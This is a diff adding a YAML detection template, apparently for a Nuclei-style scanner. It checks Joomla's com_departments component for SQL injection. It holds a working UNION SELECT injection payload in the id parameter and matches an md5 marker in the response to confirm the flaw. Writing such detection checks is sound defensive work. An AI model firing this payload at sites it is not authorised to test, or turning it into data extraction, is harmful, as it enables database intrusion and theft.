@@ -1,0 +1,19 @@
+id: joomla-department-sqli
+brief:
+    title: Joomla `departments` - SQL Injection
+    by: ritikchaddha
+    level: high
+    about: Joomla! `com_departments` parameter contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrati...
+    label:
+        - joomla
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?option=com_departments&id=-1%20UNION%20SELECT%201,md5({{num}}),3,4,5,6,7,8--'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(num)}}'
+          in: body
